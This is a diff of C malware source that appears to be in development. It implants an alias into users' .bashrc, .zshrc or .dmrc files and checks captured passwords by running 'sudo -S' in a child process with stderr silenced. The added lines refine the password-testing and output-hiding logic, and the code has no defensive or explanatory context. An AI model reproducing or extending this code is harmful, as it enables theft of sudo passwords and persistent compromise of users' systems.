@@ -18,10 +18,14 @@ static void sighandler(int signo){}
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
 int main(int argc, char ** argv){
-  signal(SIGQUIT, sighandler);
-  signal(SIGINT, sighandler);
-  signal(SIGSTOP, sighandler);
-  signal(SIGTSTP, sighandler);
+
+  //printf("%d\n", argc);
+  //printf("%s\n", argv[2]);
+//   signal(SIGQUIT, sighandler);
+//   signal(SIGINT, sighandler);
+//   signal(SIGSTOP, sighandler);
+// //  signal(SIGTSTP, sighandler);
+//   signal(SIGTERM, sighandler);
   //set mode
   int mode = P_IMPLANT;
   for (int i = 0; i<argc; i++){
@@ -155,10 +159,8 @@ int append_virus(char * home_dir, char * config_file, char * alias){
 
 int testSudoPassword(char * passwd){
   // The first three command line arguments are path to file, SUDO, sudo
-  char ** fillerArray = (char**)calloc(4, sizeof(char*));
-
-  *(fillerArray) = (char*)malloc(strlen("sudo")*sizeof(char));
-  strcpy(*(fillerArray), "sudo");
+  char * fillerArray[] = {"/bin/sudo", "-S", "ls", NULL};
+  //printf("%s\n", *(fillerArray));
 
   return runSudo(passwd, fillerArray);
 
@@ -167,6 +169,8 @@ int testSudoPassword(char * passwd){
 // Runs sudo with given arguments and returns 0 if successful, something else if not
 int runSudo(char * passwd, char ** argAry){
   int forkResult = fork();
+
+//  printf("%s\n", argAry[0]);
 
   // Parent waits for child, returns result of child's sudo
   if (forkResult > 0){
@@ -183,9 +187,18 @@ int runSudo(char * passwd, char ** argAry){
   // Child runs sudo
   if (forkResult == 0){
 
+
+    int newStdErr = dup(fileno(stderr));
+    int blackHole = open("/dev/null", O_WRONLY, 0);
+    dup2(blackHole, fileno(stderr));
+    //dup2(blackHole, fileno(stdout));
+
+    //printf("output\n");
+
     printf("Running sudo\n");
-    int execResult = execvp(*(argAry), argAry);
+    int execResult = execvp(argAry[0], argAry);
     if (execResult == -1){
+      perror("");
       printf("Execvp failed to run sudo\n");
     }
   }
